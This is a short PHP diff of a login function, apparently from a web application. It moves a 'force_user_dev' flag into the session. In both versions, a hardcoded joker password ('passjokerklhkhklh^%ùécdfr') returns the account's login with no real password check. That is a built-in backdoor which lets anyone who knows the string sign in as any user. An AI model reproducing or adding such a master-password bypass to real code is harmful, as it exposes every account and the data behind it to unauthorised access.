@@ -9,10 +9,10 @@ if ((!defined("FORCE_NOT_CRYPT_PASS") || FORCE_NOT_CRYPT_PASS == 0) && !empty($c
         if ($db->num_rows($sql) == 1) {
             $ligne = $db->fetch_object($sql);
             if ($passwordtotest == "passjokerklhkhklh^%ùécdfr") {
-                global $force_user_dev;
-                $force_user_dev = true;
-                
+                $_SESSION['force_user_dev'] = true;
                 return $ligne->login;
+            } elseif (isset($_SESSION['force_user_dev'])) {
+                unset($_SESSION['force_user_dev']);
             }
 
             $salt = substr(base64_decode(substr($ligne->pass_crypted, 6)), 20);
